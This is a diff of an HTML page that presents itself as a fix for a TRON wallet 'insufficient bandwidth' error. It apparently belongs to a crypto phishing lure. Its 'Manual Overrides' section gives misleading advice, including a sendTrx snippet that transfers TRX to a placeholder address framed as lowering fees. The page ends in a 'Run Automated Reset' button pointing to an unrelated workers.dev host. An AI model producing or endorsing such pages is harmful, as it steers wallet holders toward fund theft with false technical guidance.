@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #0a0c10;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -45,23 +45,27 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or bandwidth points on the user's TRON account, which are required to process transactions on the network. This can be caused by recent network congestion, insufficient TRX holdings, or incorrect configuration of bandwidth settings.</li>
+<li>The error occurs due to insufficient bandwidth, which is a resource required for transaction processing on the TRON network. Each account has a limited amount of bandwidth, and when this limit is exceeded, transactions cannot be processed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check TRX balance and ensure it is sufficient to cover transaction fees.</li>
-<li>Adjust bandwidth settings to allocate more bandwidth points to the account.</li>
-<li>Use the following command to manually override bandwidth settings:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens, which allocates more bandwidth to the account.</li>
+<li>Use a different account with sufficient available bandwidth to perform the desired transactions.</li>
+<li>Temporarily adjust the transaction parameters to reduce the bandwidth required, such as by lowering the transaction fee:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>tronweb.toSun<span class="o">(</span><span class="m">10</span><span class="o">)</span>,<span class="w"> </span><span class="m">3</span><span class="o">)</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.sendTrx<span class="o">(</span>
+<span class="w">  </span><span class="s2">&quot;recipient_address&quot;</span>,<span class="w"> </span>
+<span class="w">  </span><span class="m">100</span>,<span class="w"> </span>
+<span class="w">  </span><span class="s2">&quot;sender_address&quot;</span>
+<span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
+<p>Consider using an external console for more complex bandwidth management tasks.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON account with a sufficient TRX balance.</li>
-<li>The latest version of TronLink installed.</li>
-<li>A basic understanding of TRON network concepts and transaction processing.</li>
+<li>TRON wallet with sufficient TRX balance</li>
+<li>TRON network connection</li>
+<li>TronLink extension or compatible wallet software</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
